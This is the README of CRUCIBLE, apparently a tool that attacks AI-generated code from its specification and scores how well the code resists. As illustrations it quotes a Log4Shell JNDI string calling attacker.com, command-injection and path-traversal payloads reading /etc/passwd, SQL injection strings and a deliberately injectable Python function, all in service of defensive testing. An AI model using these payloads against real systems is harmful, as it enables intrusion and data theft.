<div align="center">

# ⚔️ CRUCIBLE

### Adversarial Co-Generation Engine

**The only system that attacks AI-generated code while it is being written.**

[![Tests](https://img.shields.io/badge/tests-342%20passing-brightgreen)](https://github.com/sanjoy1234/crucible/actions)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue)](https://pypi.org/project/crucible-ai/)
[![PyPI](https://img.shields.io/pypi/v/crucible-ai)](https://pypi.org/project/crucible-ai/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![SARIF 2.1](https://img.shields.io/badge/output-SARIF%202.1%20%7C%20JUnit%20%7C%20HTML-informational)](https://github.com/sanjoy1234/crucible)
[![NIST SSDF](https://img.shields.io/badge/compliance-NIST%20SSDF%20%7C%20OWASP%20%7C%20HIPAA%20%7C%20FINRA-orange)](https://github.com/sanjoy1234/crucible)

[**Quickstart**](#-five-minute-quickstart-zero-cost) · [**How It Works**](#-how-crucible-works) · [**Enterprise**](#-enterprise-features) · [**CLI Reference**](#-complete-cli-reference) · [**Compliance**](#-compliance--regulatory-domains) · [**Contributing**](#-contributing)

---

*"Every team is shipping AI-generated code. Almost no one is adversarially testing it."*

</div>

---

## The Problem That Started This

It is 2026. Your engineering team uses AI coding assistants every day. Features ship faster than they ever have. The code passes CI. PRs get approved. Everything looks fine.

Then your security team runs a penetration test and finds SQL injection in the login endpoint — code that was generated in an afternoon sprint, reviewed in twenty minutes, and merged without anyone asking: *what would an attacker do with this?*

Or your compliance team receives a HIPAA audit notice. An AI-generated API endpoint is returning PHI in error messages. The code never had a human author who would have thought to apply output encoding. The AI followed the spec. The spec didn't mention output encoding. Nobody adversarially tested it.

Or a FINRA examination flags an AML detection gap in a fraud scoring engine. The code is correct by every unit test. But an attacker who understands the spec can craft transactions that slip beneath the detection threshold — and the code, following the spec faithfully, lets them through.

This is not hypothetical. It is happening across every regulated industry — finance, healthcare, government, insurance — right now, at scale.

**The root cause is a distinction almost no one in the industry has named clearly.**

---

## 🏦 The Perimeter Security Fallacy — A Message for Enterprise Architecture Boards

> *"Our infrastructure is secure. Private cloud. SSO everywhere. VPN-enforced endpoint control. All API traffic runs through our WAF. We've never had a perimeter breach. Why do we need to think about application-level security in generated code?"*

This is the most important question an enterprise architecture review board will ask. It deserves a direct, grounded, evidence-based answer — not a sales pitch.

**The short answer:** Application-layer vulnerabilities do not require a perimeter breach to cause a catastrophic incident. The incidents that have cost regulated financial and healthcare organizations billions of dollars in the last five years exploited code-level weaknesses — inside perfectly intact network perimeters, in environments with every enterprise security control in place.

Let's look at the evidence.

### What the incidents actually tell us

**MOVEit Transfer — 2023 (CVE-2023-34362)**

MOVEit Transfer was an enterprise managed file transfer solution used by banks, insurance companies, healthcare systems, and government agencies. These organizations had network perimeters, VPCs, VPNs, and enterprise access controls. The attack did not breach any of those controls.

Instead, it exploited a **SQL injection vulnerability in the application code** — CWE-89, the same class of vulnerability that appears in the OWASP Top 10 every year. A single untrusted input flowing into a SQL statement without parameterization. No network breach required. The attacker queried an API endpoint accessible through the normal application path.

Result: **2,700 organizations compromised. 93.3 million individual records exposed. Estimated cost: $15.8 billion** (based on IBM's $165/record average breach cost). Victims included organizations across healthcare (20% of victims), finance and professional services (13%), and government. Every one of those organizations had a network perimeter.

**Capital One — 2019**

Capital One operated on AWS — one of the most security-reviewed cloud environments in the industry. They used VPCs, IAM policies, security groups, and all standard AWS enterprise controls. The network was not breached.

The attack exploited a **Server-Side Request Forgery (SSRF) vulnerability** — CWE-918 — in a misconfigured web application firewall running as an EC2 instance. The attacker sent an HTTP request to the WAF, which the WAF's application code forwarded to the AWS EC2 metadata service at `169.254.169.254`. The metadata service returned IAM credentials. From there, the attacker accessed S3 buckets containing the data of 106 million customers.

The network perimeter was intact. The VPC was intact. IAM policies were applied. The application code — specifically the WAF's request processing logic — was the attack surface.

**Log4Shell — 2021 (CVE-2021-44228, CVSS 10.0)**

Log4Shell was a remote code execution vulnerability in Apache Log4j — a logging library used in millions of Java applications worldwide. The vulnerability was not at the network layer. It was at the application layer: when a Java application logged a string containing a user-controlled value, Log4j would attempt to resolve JNDI lookups embedded in that string. If the string contained `${jndi:ldap://attacker.com/exploit}`, Log4j would connect to the attacker's server and execute arbitrary Java code.

The implications for regulated industries: **93% of enterprise cloud environments were vulnerable**, according to Wiz and EY. Financial institutions running Java-based trading systems, database connectors, and banking middleware were equally exposed — regardless of their network architecture. A user-controlled string reaching any log statement was the attack vector. No perimeter crossing required.

IBM's banking and financial markets data warehouse products were explicitly affected. Ten days after disclosure, only 45% of vulnerable workloads had been patched — meaning regulated institutions were exposed for weeks, through no failure of their network security.

**SolarWinds Orion — 2020**

The SolarWinds attack did not begin with a network breach. It began in the **software build process** — application code. Attackers compromised SolarWinds' build pipeline and inserted the SUNBURST backdoor into a legitimate software update. When the signed, trusted update was installed by SolarWinds customers — financial institutions, government agencies, defense contractors — the backdoor entered their environments through the exact channel their security controls were designed to trust.

The backdoor then operated inside those environments for months, communicating via normal-looking HTTPS traffic. The perimeter security of affected organizations was not circumvented. It was rendered irrelevant, because the threat originated from application code in a trusted software component.

### Why strong perimeter security creates a false sense of assurance

The incidents above share a structural pattern that security architects need to internalize:

**Perimeter security controls the channel.** It determines who can knock on the door and through what protocol. It does not determine what happens to the input once the door is opened.

When an authenticated, VPN-connected, SSO-verified user submits a request to your application, every perimeter control has done its job. The request is legitimate from the network's perspective. What happens next — how the application processes that input — is entirely determined by application code. SQL parameters, HTML encoding, file path validation, object deserialization handling, authorization checks: none of these are performed by the network. All of them are performed by code.

This is why **every major security framework explicitly requires application-layer security testing regardless of network controls:**

- **PCI DSS 4.0, Requirement 6.3.2:** Maintain an inventory of all bespoke and custom software. Require documented security training for developers. Requirement 11.3 mandates penetration testing of all in-scope components — including applications — at least once every 12 months and after significant changes.
- **NIST SP 800-218 (SSDF):** Explicitly requires secure software development practices at the code level as distinct from and complementary to infrastructure security. PW.4 specifically requires input validation and output encoding; RV.2 requires vulnerability identification in produced software.
- **FFIEC (Federal Financial Institutions Examination Council):** Includes application security as a distinct supervisory domain, separate from network and infrastructure controls.

These are not suggestions. For regulated financial and healthcare institutions, they are compliance requirements.

### The insider threat reality

A strong network perimeter is entirely irrelevant to insider threats. **Over 70% of financial services firms face significant insider threat risk**, and the average insider incident now costs $16.2 million. An authenticated employee with legitimate system access can probe your application endpoints for authorization gaps, IDOR vulnerabilities, and data exposure — from inside the perimeter, with valid credentials, through channels your WAF allows without question.

Application-layer controls — authorization checks, object-level access validation, row-level security, principle of least privilege in code — are the only defenses against insider threats. The network sees an authenticated request and lets it through. The code decides whether the authenticated user is authorized to access *this specific resource*.

### The AI code multiplier — why this matters more than it did in 2019

Everything above predates the AI coding assistant era. In 2024–2026, the risk profile changed structurally.

A 2022 empirical study (Pearce et al.) found that GitHub Copilot generated code with security vulnerabilities in approximately 40% of security-sensitive scenarios. For SQL injection specifically (CWE-89 — the MOVEit vulnerability class), vulnerability rates in specific scenarios reached 65–75%. A more recent 2024 analysis found approximately 30% of Copilot-generated code snippets contain security weaknesses across 43 CWE categories.

In 2025, the Cloud Security Alliance published research documenting:
- AI-assisted commits expose hardcoded secrets at **twice the rate** of human-written code (3.2% vs 1.5%)
- In testing of five major AI coding agents, **every single one** introduced SSRF vulnerabilities in apps with URL-handling features
- Georgetown CSET found **XSS vulnerabilities in 86% of AI-generated code samples** tested across five major LLMs
- CVEs formally attributed to AI-generated code grew from 6 in January 2026 to 35 in March 2026 — and researchers estimate the actual count is 5–10× higher

A SecurityWeek analysis documented a **10× increase in security findings per month** within Fortune 50 enterprises between December 2024 and June 2025 — from approximately 1,000 to over 10,000 monthly vulnerabilities — correlating directly with the adoption of AI coding agents.

The pattern is not that AI writes uniquely dangerous code. The pattern is that **AI writes what the spec says, at a volume and velocity that has fundamentally outpaced the security review capacity of any human team.** Your network perimeter controls will process 10× the volume of AI-generated feature code this year compared to last. The application-layer risk surface has grown in direct proportion.

### The practical synthesis for architecture review boards

The question was: *"Our network is secure. Do we need application-level security in AI-generated code?"*

The architecture board answer is:

1. **Your network security is necessary.** Keep it. Strengthen it. It is one layer of a required stack.

2. **Your network security does not protect against CWE-89, CWE-79, CWE-918, CWE-502, or any of the vulnerability classes that caused the MOVEit, Capital One, and Log4Shell incidents.** These vulnerabilities are resolved by application code — or not resolved, if the AI generating that code didn't think to apply the defense.

3. **Every framework you are regulated by — PCI DSS, NIST SSDF, HIPAA Security Rule, FFIEC — explicitly requires application-layer security controls as a separate compliance domain from network controls.** These are not overlapping requirements. They address different layers.

4. **The AI coding agent adoption your organization has made (or is making) has increased your application-layer risk surface at a rate that human security review cannot match.** The question is not whether to have application-layer security in AI-generated code. The question is whether you have a systematic, automated mechanism for enforcing it at the speed of generation.

CRUCIBLE is that mechanism — purpose-built for the AI coding agent era, at the layer that network security cannot reach.

---

## What Does "Adversarially Resilient AI-Generated Code" Actually Mean?

This is the question at the heart of CRUCIBLE. It is worth spending time here, because if you understand this distinction, everything else follows.

### Functional correctness vs. adversarial resilience

When we say code is **functionally correct**, we mean: it does what the spec says.

The spec says "authenticate users." The AI generates an authentication function. Tests pass. PR merges. ✓

When we say code is **adversarially resilient**, we mean something fundamentally different: the code holds up when a motivated, intelligent attacker deliberately tries to make it misbehave — including attacks that the spec never mentioned, attacks that no unit test covers, attacks that only emerge when you ask "what does this code look like from the other side of the trust boundary?"

A single endpoint can be **functionally correct and adversarially empty at the same time**:

```python
# Spec: "Accept a username and return the user's profile"
# Generated code: functionally correct — it returns the profile

def get_profile(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"  # CWE-89
    result = db.execute(query)
    return result.fetchone()
```

This code does exactly what the spec says. Every functional test passes. But an attacker who sends `username = "' OR '1'='1"` now owns your entire users table. The spec said nothing about SQL injection. The AI had no reason to know it should parameterize the query. The unit tests had no reason to send adversarial input.

**This is the gap CRUCIBLE is designed to close.**

### The three properties of adversarial resilience

Adversarial resilience in AI-generated code has three distinct properties that must all hold simultaneously:

**1. Completeness of defense** — the code defends against the *full threat model implied by its business context*, not just the attacks the developer happened to think of while writing it. A healthcare API implies PHI protection even if the spec says nothing about HIPAA. A financial transaction endpoint implies AML even if the spec just says "process payment."

**2. Correctness of defense** — having a defense is not enough if it is bypassable. Input validation that checks for `<script>` but not `<Script>` or `&#60;script&#62;` is a partial defense. SQL filtering that strips `DROP TABLE` but doesn't use parameterized queries is a partial defense. CRUCIBLE scores partial defenses at 0.5, not 1.0 — because a partial defense gives false confidence.

**3. Depth of defense** — security controls must be applied at the right layers. Input validation at the controller layer can be bypassed if the same value flows unchecked into a different code path. The Breaker probes for defense-in-depth failures: does every path from untrusted input to sensitive operation have a checkpoint?

### Why AI models have a structural weakness here

AI code generation models are trained to minimize the distance between *what the spec says* and *what the code does*. That is exactly the right objective for functional correctness. It is exactly the wrong objective for adversarial resilience.

Security invariants that every experienced engineer knows are **implicit, unstated, and domain-specific**:

- "Every string that touches a database must be parameterized" — not in your spec
- "Every user-controlled value rendered in HTML must be encoded" — not in your spec  
- "Every file path from user input must be canonicalized and validated against an allowlist" — not in your spec
- "Every deserialized object from an untrusted source must be type-checked before use" — not in your spec
- "Every AML transaction score must be signed so the score cannot be tampered with in transit" — not in your spec

The AI faithfully implements what is written. It has no ambient threat model. It does not know that your "accept username" endpoint will one day be called by an attacker with a SQL injection payload, not just your test suite with clean strings.

---

## The Twelve Levers of Resilience CRUCIBLE Tests

CRUCIBLE's Breaker probes generated code against twelve categories of adversarial attack, selected and weighted by the language and business domain detected from the specification.

### 1. Injection Resistance (CWE-89, CWE-78, CWE-94, CWE-1343)

Does the generated code safely handle user-controlled data that flows into interpreters — SQL, OS shell, eval(), LDAP, XPath, template engines?

*What the Breaker checks from the spec:* Every place the spec implies an input that might flow into a storage or execution layer. The Breaker generates payloads like `'; DROP TABLE users; --`, `$(cat /etc/passwd)`, `{{7*7}}` (template injection) and evaluates whether the generated code would pass them through undefended.

### 2. Output Encoding (CWE-79, CWE-116)

Does the generated code encode data in the correct context before outputting it — HTML encoding for HTML contexts, URL encoding for URLs, JSON escaping for JSON responses?

*What the Breaker checks from the spec:* Every place the spec implies a user-controlled value is echoed back — error messages, search results, display names, filenames shown to the user. Reflected XSS is the canonical miss here: the spec says "show the error message," the AI shows it, and user-controlled content in the error is now executable in the victim's browser.

### 3. Authentication Integrity (CWE-287, CWE-384, CWE-798)

Does the generated code implement authentication mechanisms correctly — no hardcoded credentials, no predictable tokens, no session fixation, no credential exposure in logs or error messages?

*What the Breaker checks from the spec:* Every authentication flow implied by the spec. Does the spec say "API key"? The Breaker checks whether the generated code exposes the key in logs. Does the spec say "session token"? The Breaker checks for fixation and replay vulnerabilities.

### 4. Authorization Correctness (CWE-285, CWE-862, CWE-863, CWE-639)

Does the generated code check not just "is this user authenticated?" but "is this specific user authorized to access this specific resource?"

*What the Breaker checks from the spec:* Object-level access control — BOLA (Broken Object Level Authorization) is the most commonly missed pattern in AI-generated code. The spec says "return the user's orders" and the AI generates `GET /orders/{id}` with no check that the authenticated user owns order `{id}`. An attacker increments the ID. Every other user's orders are exposed.

### 5. Deserialization Safety (CWE-502)

Does the generated code safely handle serialized data — pickle, YAML with `yaml.load()`, Java object deserialization, XML with entity expansion — from untrusted sources?

*What the Breaker checks from the spec:* Every place the spec implies data is accepted from an external source and processed. `yaml.load()` in Python executes arbitrary Python when given a crafted document. The AI generates it because it is the natural way to parse YAML. The Breaker probes whether the generated code uses `yaml.safe_load()` instead.

### 6. Path Traversal and File System Safety (CWE-22, CWE-73)

Does the generated code prevent directory traversal attacks — `../../etc/passwd` — when handling user-controlled file paths?

*What the Breaker checks from the spec:* Every place the spec implies file system access based on user input — file uploads, file downloads, log viewers, configuration readers. The Breaker generates traversal payloads and checks whether the generated code validates and canonicalizes paths before use.

### 7. Cryptographic Correctness (CWE-327, CWE-321, CWE-330, CWE-311)

Does the generated code use strong cryptographic algorithms, generate properly random values, store credentials with appropriate hashing, and avoid hardcoded secrets?

*What the Breaker checks from the spec:* Every place the spec implies data must be protected — password storage, token generation, data at rest encryption. `MD5` for password hashing, `random()` instead of `secrets.token_bytes()` for security tokens, symmetric keys embedded in source — all CWEs the AI generates naturally unless specifically told not to.

### 8. Race Condition and Concurrency Safety (CWE-362, CWE-367)

Does the generated code protect shared state against time-of-check/time-of-use (TOCTOU) races and concurrent modification?

*What the Breaker checks from the spec:* Every place the spec implies a check followed by an action that must be atomic — "check if user has credits, then deduct credits"; "check if file exists, then open it." Race conditions are especially common in AI-generated async Python, Go goroutines, and JavaScript Promise chains.

### 9. Prototype Pollution (CWE-1321 — JavaScript/TypeScript only)

Can an attacker inject properties into `Object.prototype` through user-controlled input to `merge()`, `extend()`, `clone()` or similar functions?

*What the Breaker checks from the spec:* Every JavaScript/TypeScript endpoint that accepts nested JSON objects or uses deep merge/copy utilities. Prototype pollution is a JavaScript-specific vulnerability class that AI generates frequently because the patterns that cause it (`Object.assign`, `_.merge`, recursive spread) are the idiomatic way to merge configuration or user objects.

### 10. Server-Side Request Forgery (CWE-918)

Can an attacker cause the generated code to make outbound requests to internal network resources — metadata services, internal APIs, cloud provider endpoints?

*What the Breaker checks from the spec:* Every place the spec implies an outbound HTTP request based on user-controlled input — webhook handlers, URL preview features, import-from-URL functionality, proxy endpoints.

### 11. Resource Exhaustion and DoS (CWE-770, CWE-674, CWE-407)

Does the generated code protect against resource exhaustion — unbounded loops, infinite recursion, memory allocation based on user-controlled size, algorithmic complexity attacks (ReDoS)?

*What the Breaker checks from the spec:* Every place the spec implies processing of user-controlled data size or structure — file parsing, regex matching against user input, recursive data structure traversal.

### 12. Sensitive Data Exposure (CWE-200, CWE-532, CWE-359)

Does the generated code avoid leaking sensitive data in error messages, logs, API responses, or HTTP headers?

*What the Breaker checks from the spec:* Every error path the spec implies. AI models consistently generate helpful error messages — "User 'alice' not found," "Invalid password for user 'alice'," "Account 'alice' locked" — that expose user existence, enumeration surface, or application internals to an attacker.

---

## Why the Spec Is the Right Attack Surface — Not the Code

This is the architectural choice that makes CRUCIBLE different from every static analyzer.

Static analysis (Bandit, Semgrep, CodeQL) reads the **generated code** and pattern-matches against known bad patterns. It asks: "Does this code contain `eval()`?" or "Does this function call `yaml.load()`?" This is valuable — but it has a fundamental ceiling. It only finds what it was programmed to look for. It finds known-bad patterns in written code.

CRUCIBLE's Breaker reads the **specification**. It asks: "Given what this code is *supposed to do*, what would a motivated attacker *try to do with it*?" This is a different question entirely — and it is the question that matters for security.

The spec is the right surface because:

**1. The spec defines the trust boundary.** The spec says "accept user input." That phrase — "user input" — is the trust boundary declaration. Everything the spec says comes from users is potentially adversarial. The Breaker reasons from that boundary.

**2. The spec implies the business domain.** "HIPAA patient portal" implies PHI protection even if the spec never says "protect PHI." "Financial transaction endpoint" implies AML constraints even if the spec never mentions FINRA. The Breaker's language profiles and domain policies encode this implicit knowledge.

**3. The spec survives implementation changes.** If you refactor the generated code, static analysis has to re-scan. CRUCIBLE's attacks against the spec remain valid because they test the *intent*, not the implementation. A vulnerability in the intent survives a refactor.

**4. The spec is where AI hallucination risk concentrates.** The AI interprets the spec, makes assumptions about unstated invariants, and generates code based on those assumptions. The Breaker tests those exact assumptions — the points where the AI had to infer something the spec didn't state.

---

## Why Devin, Copilot, SWE-Agent, and OpenHands Don't Do This — And Structurally Cannot

This is the question every engineering leader asks. The answer is not that other tools are behind — it is that **they are solving a different problem with a different optimization target.**

**Copilot** (and all inline code completion tools) optimize for *developer velocity*: complete the current line of code as fast as possible in the context of what the developer is already writing. The security signal available to an inline autocomplete model is zero — it does not know what the finished function will do, what data it will receive, or what trust boundary it crosses.

**Devin, SWE-agent, OpenHands** optimize for *task completion*: given a GitHub issue or a bug report, produce a PR that fixes it. Their success metric is "does the code pass the tests?" or "does the PR get merged?" Neither metric has any adversarial component. When Devin generates a fix, it has no mechanism to ask "what would an attacker do with this fix?" — it has a spec (the issue), it has a codebase, it has tests, and it generates code that satisfies all three. Adversarial resilience is not in the success function.

**Why they *can't* add it without fundamental architectural change:**

Adding concurrent adversarial testing to a sequential code generation tool is not an additive feature. It requires:

1. A **second agent** (the Breaker) that runs *concurrently* with the Builder and reasons from the specification, not from the generated code
2. An **Arbiter** that scores each attack against the generated code in a domain-aware way
3. A **persistent adversarial memory** (Knowledge Forge) that carries forward what was learned about this codebase's attack surface across every future run
4. A **gate mechanism** that can block CI/CD pipelines based on the adversarial score
5. **Compliance artifact generation** that maps attacks to regulatory control frameworks

None of these are features you add to a sequential code generator. They require the adversarial loop to be the architectural primitive — which is exactly what CRUCIBLE was designed as from the ground up.

**The economic incentive gap:** Tools like Devin and Copilot are measured by developer adoption — developers choose them when they make coding faster. Security outcomes are not in the adoption metric. CRUCIBLE is measured by a different success function entirely: how many adversarial attacks does the generated code correctly defend against? This is the right metric for regulated industries, but it requires accepting that some PRs will be blocked — which is the opposite of what developer-velocity tools optimize for.

---

## The Adversarial Resilience Score (ARS): A Formal Definition

The ARS is CRUCIBLE's answer to the question: "How resilient is this AI-generated code to a motivated attacker who understands its specification?"

```
ARS = Σ(attack_scores) / N

where:
  N            = number of attacks fired (5 for quick, 20 for standard, 50 for thorough)
  attack_score = 1.0  if the generated code correctly mitigates the attack
               = 0.5  if a partial defense exists but is bypassable or incomplete
               = 0.0  if no defense exists — an attacker would succeed

ARS range: [0.0, 1.0]
  1.0  =  perfect adversarial resilience for all attacks fired
  0.87 =  4 of 5 attacks mitigated, 1 missed (typical first-run score)
  0.50 =  half the attacks succeed — security-critical code, do not ship
  0.0  =  no defenses detected — generative output with no security consideration
```

**ARS is not a test pass rate.** A test pass rate measures whether the code does what it should. ARS measures whether the code holds up against what it should *not* allow. The two can be completely independent: code can be 100% test-passing and 0.0 ARS simultaneously (functionally correct, adversarially empty).

**ARS is tamper-evident.** Every report carries a SHA-256 hash over the ordered attack array. `crucible verify <run_id>` re-derives this hash at any future point — the score cannot be altered post-generation without detection. This is what makes ARS usable as a compliance artifact.

**ARS is a gate, not a suggestion.** With `fail_open: false` in `.crucible.yml`, ARS below `minimum_ars` causes `crucible run` to exit with code 1 — blocking the CI pipeline, preventing the PR merge. Not an advisory. A hard, cryptographic, audit-traceable gate.

**ARS trends over time reveal the learning effect.** Because the Knowledge Forge carries forward every scored attack across builds, the Breaker gets more effective with each run — more targeted to the specific vulnerability patterns your codebase generates. ARS scores for a given spec type typically improve monotonically over 5-10 runs as the Forge learns what attacks your builders actually need to defend against.

---

## The Core Insight — Concurrency as the Execution Primitive

Every AI coding tool today follows the same sequential pattern:

```
Spec  →  AI generates code  →  Tests run  →  [maybe] Security scan  →  Ship
                                                           ↑
                                              afterthought, post-hoc, too late
```

CRUCIBLE's architecture inverts this:

```
                    ┌─────────────────────────────────────────────────┐
                    │              asyncio.gather()                     │
                    │                                                   │
Spec ──────────────►│  Builder ──────────────────────────────► Code    │
          │         │                                                   │
          └────────►│  Breaker ──► [CWE attacks] ──► Arbiter ──► ARS  │
                    │                                                   │
                    └─────────────────────────────────────────────────┘
                              Both start at t=0. Both finish together.
```

The **Builder** and **Breaker** start at the same instant, run concurrently, and both read the same specification. The Breaker does not wait for code to exist — it reasons adversarially from the specification, the same source of truth the Builder uses to generate the implementation.

By the time the Builder finishes, you do not just have code. You have code *and* an adversarial score *and* a full Resilience Report *and* SARIF for GitHub Code Scanning *and* a Forge Ledger entry for every attack. The security measurement is not an afterthought. It co-exists with the generation.

ARS < 0.80 with `fail_open: false` means the PR cannot merge. Not a warning. Not an advisory. A hard, cryptographic gate.

---

## 💡 Why Concurrent Matters — The Value You Are Actually Getting

> *"You could test security after the build. So why does it matter that CRUCIBLE attacks at the same time as generation?"*

This is the right question, and the answer is **not about speed**. Concurrent execution provides value that sequential execution cannot provide, regardless of how fast the sequential approach is.

### The difference is not time — it is the attack surface

When you run a security scanner **after** code is built, you are attacking the **implementation** — what the AI decided to do.

When CRUCIBLE's Breaker runs concurrently from the **specification**, it attacks the **intent** — what the system was supposed to do. These are different things, and attackers attack intent, not implementation.

An attacker who reads your GitHub issue or product spec does not care how your ORM formats queries. They care about: *can I make this system do something it was not supposed to do?* The gap between "what was intended" and "what was defended" is exactly where vulnerabilities live.

By attacking from the spec, CRUCIBLE tests the same surface attackers test. Post-build scanners test the surface developers created.

### The anchoring problem that sequential testing cannot escape

When a human security reviewer sees code first, they unconsciously anchor to: *"What does this code do?"* This is anchoring bias — the brain's natural tendency to interpret new information in the context of what it already knows.

A post-build scanner has the same structural problem: it sees the code as-is and evaluates whether it contains known bad patterns. It has been anchored to the implementation.

CRUCIBLE's Breaker **never sees the generated code**. It reasons purely from the specification, in an adversarial frame, without any anchor to the implementation choices the Builder made. It asks: *"What would an attacker do with this system as described?"* — not *"Is this code I'm looking at secure?"*

This is a fundamentally different cognitive frame, and it consistently surfaces attacks that implementation-anchored review misses.

### The commitment trap — why post-build security review fails in practice

By the time a security review runs on generated code, several things have already happened:

1. The AI generated the implementation (encoding all its implicit assumptions into the code)
2. A developer read, understood, and approved the PR
3. The code reviewer mentally classified the code as "working" and "correct"
4. The CI pipeline ran and passed
5. The team has emotionally moved on to the next task

Now you find a critical vulnerability. What happens?

- A new PR must be opened
- The original PR must be reverted or hot-patched
- The developer must re-context-switch back to code they "finished" days ago
- A new review cycle is required
- Timeline pressure builds because the feature was "already done"

The result — in practice, across real engineering teams — is that security findings from post-build review are **negotiated, deferred, or closed as "acceptable risk"** at a rate that findings from pre-commit testing simply are not. Not because engineers are negligent, but because the sunk cost of already-written code creates enormous pressure to ship it.

CRUCIBLE catches findings before the first commit is made. The code does not yet have a commit hash. There is no PR to close. There is no sunk cost to overcome. The finding is a diff, not a regression.

### The "same timestamp" proof — concurrency creates a causal chain

Here is a specific property that concurrent execution creates and sequential execution cannot replicate: **causal linkage between generation and attack surface**.

When the Builder and Breaker run against the same spec at the same timestamp, with the same run ID, every attack in the Forge Ledger is causally linked to a specific generation event. The ARS is not a score *of the code* — it is a score *of the spec-to-code translation* at that specific moment.

This matters for two reasons:

**Audit:** A compliance team can produce a run ID and say: "When we generated this code on this date, it achieved ARS 0.92 against 20 adversarial attacks, verified by SHA-256 hash `a7f3b2c9...`." That is a tamper-evident, timestamped, generation-time security artifact. No post-build scanner can produce a score that is causally linked to the act of generation — because by the time they run, the code already exists independently of the generation event.

**Learning:** Because each attack was scored against a specific spec + fingerprint combination, the Knowledge Forge can recall *which attack patterns are semantically similar to the ones your type of spec generates*. Post-build scanners learn from CVE databases — generic patterns across all codebases. CRUCIBLE learns from your specific spec patterns — highly targeted recall for your codebase's actual generation style.

### The NIST cost curve — why the moment of attack matters

NIST studies on security bug remediation costs put the numbers at:

| Phase detected | Avg remediation cost |
|---------------|---------------------|
| Design / spec | $60 |
| Implementation | $500 |
| Code review | $2,000 |
| QA / test | $5,000 |
| Production | $30,000 – $300,000 |

Traditional security testing operates at **code review** or **QA** phases. CRUCIBLE operates at the **design/implementation boundary** — simultaneously. The cost difference is not a multiplier. It is an order of magnitude.

Across an engineering team shipping 50 AI-generated features per quarter, the economic case is straightforward:

```
50 features × 2 security findings each = 100 findings per quarter

Detected at code review  ($2,000 ea):  $200,000/quarter in remediation
Detected at production   ($30,000 ea): $3,000,000/quarter in remediation
Detected by CRUCIBLE pre-commit ($60 ea): $6,000/quarter in remediation
```

### What concurrent execution is NOT

To be clear about what CRUCIBLE does and does not claim:

- **Not a replacement for penetration testing.** Pentesting by human experts with full system access will always discover attacks that CRUCIBLE misses. CRUCIBLE is not a pentest.
- **Not a SAST/DAST replacement.** Static and dynamic analysis tools that scan the full codebase have different — often complementary — coverage. CRUCIBLE does not scan your existing codebase; it adversarially tests each spec-to-code generation event.
- **Not faster security testing.** CRUCIBLE is not a faster version of existing security testing. It is a different operation — adversarial specification review — that operates at a different point in the pipeline.

CRUCIBLE's claim is specific: **for AI-generated code, the moment of generation is the right moment to test adversarial resilience, because that is when the trust assumptions are being encoded.** Once the code is committed, those assumptions are structural. Correcting them is expensive. Preventing them is not.

### Summary — the six structural advantages of concurrent adversarial testing

| Property | Post-Build Security Testing | CRUCIBLE Concurrent Testing |
|----------|---------------------------|---------------------------|
| **Attack surface** | Implementation (code as-is) | Specification (intent, same surface as real attackers) |
| **Anchoring bias** | Scanner / reviewer anchored to code | Breaker never sees code — pure adversarial reasoning |
| **Timing** | After commit, after review, after PR | Before first commit exists |
| **Causal linkage** | Score of code (post-hoc) | Score of generation event (causal, tamper-evident) |
| **Learning** | Generic CVE patterns | Forge recalls patterns specific to your spec type |
| **Economic moment** | Code review / QA phase ($2K–$5K/finding) | Design/implementation boundary ($60/finding) |

---

## ⚡ Five-Minute Quickstart (Zero Cost)

CRUCIBLE runs completely locally on [Ollama](https://ollama.ai). No API key. No signup.

```bash
# 1. Install Ollama and pull a model
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull llama3.1:8b

# 2. Install CRUCIBLE
pip install crucible-ai

# 3. Initialize project config
crucible init

# 4. Run on the included demo spec
crucible run --issue examples/demo_issue.md --mode quick --pretty
```

**Expected output — 43 seconds, $0.00:**

```
──────────────────────────────────────────────────────────────────────
  CRUCIBLE Adversarial Run
  Run ID:    crucible-2026-06-28T12-00-00Z-a3f9
  Mode:      quick (5 attacks)
  Language:  python  [signals: filesystem, async]
  Domain:    owasp_top10
──────────────────────────────────────────────────────────────────────
  ARS Score: 0.87  ✅  PASSED  (gate: ≥ 0.80)

  Attack breakdown:
  ✅ CWE-89  SQL Injection via username param     score: 1.0  mitigated
  ✅ CWE-502 Unsafe deserialization               score: 1.0  mitigated
  ✅ CWE-78  OS command injection in file path    score: 1.0  mitigated
  ✅ CWE-22  Path traversal in upload handler    score: 1.0  mitigated
  ❌ CWE-79  Reflected XSS in error message      score: 0.0  MISSED

  Elapsed:  43.2s
  Report:   .crucible/reports/crucible-2026-06-28T12-00-00Z-a3f9.json
  Ledger:   .crucible/vault/CWE-79/a3f9-atk-001-xss-reflected.md
──────────────────────────────────────────────────────────────────────
```

---

## 🔑 Quickstart — Anthropic API

```bash
export ANTHROPIC_API_KEY=sk-ant-...
crucible run --issue examples/demo_issue.md --mode quick --pretty

# quick mode  (5 attacks):  ~$0.08  ~15s
# standard    (20 attacks): ~$0.30  ~60s
# thorough    (50 attacks): ~$0.75  ~3min
```

## 🔗 Quickstart — From a GitHub Issue URL

```bash
export GITHUB_TOKEN=ghp_...     # optional — increases rate limit
crucible run \
  --issue https://github.com/your-org/your-repo/issues/42 \
  --mode standard \
  --domain hipaa \
  --pretty
```

CRUCIBLE pulls the issue body as the specification, fingerprints the target language from context, selects the right CWE profile, and runs.

---

## 🔬 Features In Depth

Every feature in CRUCIBLE exists to close a specific gap in how AI-generated code is understood, measured, and defended. This section walks through each one — not just what it does, but *why it exists* and what it looks like when you use it.

---

### Feature 1 — The CombatPair Engine

**The problem it solves:** Sequential security testing is fundamentally reactive. By the time you run a scanner on generated code, the code is already written, often already reviewed, sometimes already merged. Fixing a security issue at that stage costs 10–100× more than preventing it at generation time.

**What it does:** The CombatPair runs two agents concurrently against the same specification using Python's `asyncio.gather()`. The Builder produces an implementation. The Breaker simultaneously produces adversarial attacks against the spec's implicit threat model. When both finish, the Arbiter scores every attack and produces the ARS.

```
┌─────────────────────────────────────────────────────────────────────────┐
│  CombatPair — asyncio.gather() execution                                 │
│                                                                           │
│  t=0  ──────────────────────────────────────────────────────────► t=43s  │
│         │                                                           │      │
│  SPEC ──┤── Builder: read spec → implement → write code ───────────┤      │
│         │                                                           │      │
│         └── Breaker: read spec → reason about attacks → fire ──────┤      │
│              ├─ t=5s:  CWE-89  SQL injection via username           │      │
│              ├─ t=12s: CWE-502 unsafe deserialization               │      │
│              ├─ t=19s: CWE-78  OS command injection in path         │      │
